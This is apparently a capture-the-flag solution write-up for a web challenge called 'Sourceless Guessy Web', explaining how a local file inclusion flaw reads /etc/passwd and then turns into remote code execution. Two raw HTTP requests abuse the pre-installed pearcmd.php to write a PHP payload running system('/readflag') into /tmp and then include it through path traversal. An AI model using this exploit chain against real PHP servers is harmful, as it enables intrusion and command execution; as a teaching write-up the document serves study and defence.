# Sourceless Guessy Web - Solution

**Author**: zeyu2001

**Category**: Web

## Baby Flag

LFI to view `/etc/passwd`

## Easy Flag

Achieve RCE through the pre-installed `pearcmd.php`

1. Write a PHP payload to `/tmp/pwn.php`:

`GET /?page=../../../../usr/local/lib/php/pearcmd.php&+config-create+/tmp/<?=system('/readflag')?>/*+/tmp/pwn.php HTTP/1.1`

2. LFI to include `/tmp/pwn.php`:

`GET /?page=../../../../tmp/pwn.php HTTP/1.1`
